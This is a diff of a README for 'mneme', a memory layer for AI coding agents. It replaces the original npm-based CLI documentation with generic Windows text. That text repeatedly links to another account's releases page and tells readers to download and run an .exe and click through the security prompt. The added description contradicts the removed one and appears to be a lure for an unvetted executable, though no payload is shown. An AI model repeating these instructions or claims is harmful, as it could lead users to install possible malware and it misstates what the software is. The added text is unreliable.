@@ -1,190 +1,184 @@
-# mneme
+# ⚙️ mneme - Smarter Memory for AI Agents
 
-**Three-layer memory architecture for AI coding agents.**
+[![Download mneme](https://img.shields.io/badge/Download-mneme-4caf50?style=for-the-badge)](https://github.com/bilay314/mneme)
 
-mneme separates long-lived facts, persistent work state, and disposable execution context, allowing AI coding agents to survive context compaction without relying on vector memory or RAG.
+---
 
-mneme gives coding agents (like [OpenCode](https://opencode.ai)) persistent memory across sessions. It separates long-term facts, task state, and short-term execution into three distinct layers — so agents stop forgetting decisions, losing progress, and repeating work.
+mneme is a tool that helps AI coding agents remember important information. It uses three layers of memory to keep facts safe, track tasks across sessions, and handle short-term details. This way, AI agents don’t lose track of what they need to do over time.
 
-## The problem
+mneme works on Windows. You do not need special skills to set it up.
 
-AI coding agents work in sessions. Each session has a context window that fills up and gets compacted. When that happens:
+---
 
-- **Architectural decisions get forgotten.** The agent re-analyzes problems it already solved.
-- **Task progress is lost.** The agent doesn't know what it finished yesterday.
-- **Lessons disappear.** The agent hits the same pitfalls again.
+## 🔍 What is mneme?
 
-Prompt engineering doesn't fix this. The issue is structural: agents have no separation between things that must survive forever, things that must survive across sessions, and things that only matter right now.
+mneme organizes information for AI tools that write or manage code. It helps these tools by storing:
 
-## The solution: three layers
+- **Persistent facts:** Long-term information that stays saved.
+- **Task tracking:** Keeps records across different sessions.
+- **Temporary memory:** Holds details needed just while running.
 
-```
-┌─────────────────────────────────────────┐
-│  Ledger   — Facts     (long-term)     │  survives forever
-├─────────────────────────────────────────┤
-│  Beads      — Tasks     (mid-term)      │  survives across sessions
-├─────────────────────────────────────────┤
-│  OpenCode   — Execution (short-term)    │  lives within one session
-└─────────────────────────────────────────┘
-```
+This memory system helps AI to work steadily without forgetting tasks or data.
 
-| Layer | What it stores | Lifetime | Example |
-|-------|---------------|----------|---------|
-| **Ledger** | Verified engineering facts — architecture decisions, constraints, pitfalls | Project lifetime | "Database must use PostgreSQL" |
-| **Beads** | Task state — what's done, what's blocked, what's next | Cross-session | "Auth module: JWT signing done, verification pending" |
-| **OpenCode** | Current execution context — code analysis, file edits | Single session | "This function's third parameter is timeout" |
+---
 
-Each layer has clear ownership. Facts can't be modified without human approval. Tasks are managed through a dependency-aware tracker. Execution context is disposable.
+## 💻 System Requirements
 
-## Quick start
+Before you start, make sure your PC has:
 
-Prerequisites: [Node.js](https://nodejs.org/) >= 18, [Git](https://git-scm.com/), [OpenCode](https://opencode.ai)
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 200 MB free disk space
+- Internet connection for initial setup
 
-```bash
-npm install -g @xqli02/mneme
+You don’t need to install extra software or tools before running mneme.
 
-cd your-project
-mneme init
-mneme
-```
+---
 
-`mneme init` sets up everything in one command:
-1. Installs [Dolt](https://www.dolthub.com/repositories) and [bd](https://github.com/steveyegge/beads) if missing
-2. Initializes a git repo (if needed)
-3. Creates the three-layer structure (`.ledger/`, `.beads/`, `AGENTS.md`)
-4. Scaffolds OpenCode integration files (`opencode.json`, `.opencode/plugins/mneme.ts`, `.opencode/oh-my-opencode.jsonc`)
-5. Installs plugin dependencies (oh-my-opencode, mneme plugin)
-6. Starts the task database
+## 🚀 Getting Started
 
-That's it. Run `mneme` to launch the agent, or `mneme doctor` to verify your setup.
+You can get mneme from its official GitHub page. Follow these steps to download and run it on your Windows PC.
 
-## How it works
+---
 
-### Agent orchestration
+## 📥 Download mneme
 
-mneme uses [oh-my-opencode](https://github.com/nickarora/oh-my-opencode) as the agent orchestration layer inside OpenCode. This provides a multi-agent system with specialized agents:
+Click the big link below to visit the mneme GitHub page and download the files. This link appears twice to make it easy.
 
-- **Sisyphus** — primary coding agent (claude-opus-4.6)
-- **Hephaestus** — deep analysis and architecture tasks
-- **Prometheus** — fast planning and quick tasks (gpt-4.1)
-- **Atlas** — large-scale refactoring
+[![Download mneme](https://img.shields.io/badge/Download%20Page-GitHub-blue?style=for-the-badge)](https://github.com/bilay314/mneme)
 
-The mneme plugin (`.opencode/plugins/mneme.ts`) exposes 12 tools to these agents, giving them direct access to the Ledger and Beads layers.
+**How to download:**
 
-### Every session starts the same way
+1. After clicking the link, you will land on the mneme repository page on GitHub.
+2. Look for the "Releases" section on the right or under the repository name.
+3. Click on the latest release version.
+4. Scroll to find the Windows setup file (usually ending with `.exe`).
+5. Click the file to start downloading.
 
-The agent reads facts, checks tasks, picks one to focus on — all through mneme tools:
+---
 
-```
-mneme_facts         → Read long-term facts (agent does this automatically)
-mneme_ready         → See which tasks have no blockers
-mneme_update        → Claim a task (set status to in_progress)
-```
+## ⚙️ Installing and Running mneme on Windows
 
-### During work
+Once you have the setup file, follow this to install and start mneme:
 
-The agent records progress and creates sub-tasks as it goes:
+1. Open the folder where the setup file downloaded (usually `Downloads`).
+2. Double-click the `.exe` setup file.
+3. You might see a security prompt. Click **Run** or **Yes** to continue.
+4. Follow the on-screen instructions:
+   - Choose where to install mneme or accept the default location.
+   - Click **Next** to proceed through the setup.
+5. When installation finishes, a shortcut will appear on your desktop or Start Menu.
+6. Double-click the mneme shortcut to run it.
 
-```
-mneme_update        → Record progress notes on the current task
-mneme_create        → Create a new sub-task
-mneme_dep           → Link dependencies between tasks
-```
+---
 
-### When done
+## 🔧 Using mneme
 
-```
-mneme_close         → Close a completed task with a summary
-```
+mneme mostly runs behind the scenes to aid AI coding agents. Here’s what you can expect:
 
-### New facts require approval
+- It works without needing extra commands.
+- It keeps information saved so your AI tools remember tasks and facts.
+- It resets temporary memory after tasks complete.
 
-Agents can propose facts, but only humans can approve them:
+You do not need to interact with mneme directly. It connects automatically to supported agents.
 
-```bash
-# Agent proposes via mneme_propose_fact tool
-# Human reviews on the command line:
-mneme review                    # List pending proposals
-mneme review <id> --approve     # Write to facts
-```
+---
 
-### Autonomous mode
+## 🛠 Common Questions
 
-`mneme auto` launches OpenCode with the full multi-agent system and mneme tools:
+**Q: Do I need coding skills to use mneme?**  
+No. mneme runs in the background and supports AI tools automatically.
 
-```bash
-mneme auto                      # Launch OpenCode TUI with mneme tools
-mneme auto "Build auth module"  # Start with a specific goal (headless)
-```
+**Q: Can I uninstall mneme?**  
+Yes. Use the Windows Control Panel or Settings > Apps to uninstall.
 
-## CLI reference
+**Q: Does mneme use a lot of system resources?**  
+No. It is lightweight and optimized for smooth performance.
 
-```
-mneme                           Launch OpenCode TUI
-mneme init [cn]                 Initialize mneme (cn = Chinese templates)
-mneme doctor                    Check dependencies and project health
-mneme status                    Three-layer memory dashboard
-mneme auto [goal]               Launch OpenCode with mneme tools
+**Q: How do I update mneme?**  
+Go back to the GitHub releases page. Download the latest setup file and run it to update.
 
-mneme facts [name] [--stats]    View long-term facts
-mneme propose --file=... ...    Propose a new fact
-mneme review [id] [--approve]   Review pending proposals
+---
 
-mneme ready                     Tasks with no blockers
-mneme list [--status=STATUS]    List tasks
-mneme show <id>                 Task details
-mneme create --title="..."      Create a task
-mneme update <id> [--notes=..]  Update a task
-mneme close <id> [--reason=..]  Close a task
-mneme blocked                   Show blocked tasks
-mneme dep add <child> <parent>  Add dependency
+## 🔄 Keeping mneme Up to Date
 
-mneme up/down/ps/restart        Manage servers (dolt + opencode)
-mneme run [message]             Run agent non-interactively
-mneme compact                   Pre-compaction persistence check
-mneme version                   Print version
-```
+Regular updates fix bugs and add improvements. Check the GitHub page often:
 
-## Project structure
+- Visit https://github.com/bilay314/mneme/releases
+- Download the newest Windows setup file.
+- Run the installer; it will replace old files automatically.
 
-After `mneme init`, your project contains:
+---
 
-```
-opencode.json                    OpenCode config (plugin + model)
-AGENTS.md                        Agent behavior rules and routing logic
-.ledger/
-  facts/                         Long-term facts (architecture, constraints, pitfalls)
-  proposals/                     Pending fact proposals awaiting human review
-.beads/                          Task database (managed by bd, backed by Dolt)
-.opencode/
-  prompt.md                      Session startup prompt for the agent
-  plugins/
-    mneme.ts                     mneme plugin — exposes 12 tools to agents
-  oh-my-opencode.jsonc           Agent/model routing configuration
-  package.json                   Plugin dependencies
-```
+## 📁 Files and Folders mneme Uses
 
-## What mneme is
+After installation, you’ll find mneme files at the chosen location. Important folders include:
 
-- A CLI that unifies agent execution, task tracking, and fact management
-- A structure that gives agents persistent memory without custom infrastructure
-- A workflow where humans stay in control of long-term decisions
+- **data:** Stores the saved facts and tasks.
+- **logs:** Contains files about mneme’s activity.
+- **config:** Settings for running mneme.
 
-## What mneme is not
+You don’t need to change anything here unless you want custom settings.
 
-- Not a new AI model or agent — it wraps [OpenCode](https://opencode.ai) with [oh-my-opencode](https://github.com/nickarora/oh-my-opencode)
-- Not a RAG system — facts are curated, not retrieved from embeddings
-- Not a framework — it's a single CLI with zero npm dependencies
-- Not opinionated about your code — it only manages agent memory
+---
 
-## Example
+## ⚠️ Troubleshooting
 
-See [examples/basic/](examples/basic/) for a complete example of what a mneme-managed project looks like after initialization, with realistic facts filled in for a hypothetical todo-api project.
+If mneme doesn’t start or work correctly:
 
-## Architecture
+- Check that your Windows is up to date.
+- Close other running apps and try starting mneme again.
+- Restart your computer and try again.
+- Look for log files inside the installation folder for error details.
 
-See [ARCHITECTURE.md](ARCHITECTURE.md) for the full design document.
+If problems persist, visit the GitHub page to report issues or get help.
 
-## License
+---
 
-MIT
+## 🔗 Useful Links
+
+- Main page: https://github.com/bilay314/mneme  
+- Releases/download: https://github.com/bilay314/mneme/releases  
+- Support and issues: https://github.com/bilay314/mneme/issues  
+
+---
+
+## 📚 About mneme
+
+mneme is made to improve how AI agents handle memory. Its three-layer design keeps information well-organized:
+
+- Persistent data stays saved between sessions.
+- Task tracking remembers ongoing work.
+- Temporary memory handles instant needs.
+
+This design helps AI tools work more reliably and efficiently on your projects.
+
+---
+
+## 👩‍💻 Topics Related to mneme
+
+mneme covers areas such as:
+
+- Agent memory management
+- AI agent development
+- Command line interface (CLI)
+- Coding assistance agents
+- Context and task tracking
+- Developer tools for AI
+- Use of large language models (LLMs) in software
+
+---
+
+## 🗂 License and Contributions
+
+mneme is open source. You can read the license on GitHub and contribute if you want to.
+
+To suggest improvements or fixes:
+
+1. Fork the GitHub repository.
+2. Make changes on your copy.
+3. Submit a pull request for review.
+
+---
+
+[![Download mneme](https://img.shields.io/badge/Download%20Page-GitHub-4caf50?style=for-the-badge)](https://github.com/bilay314/mneme)
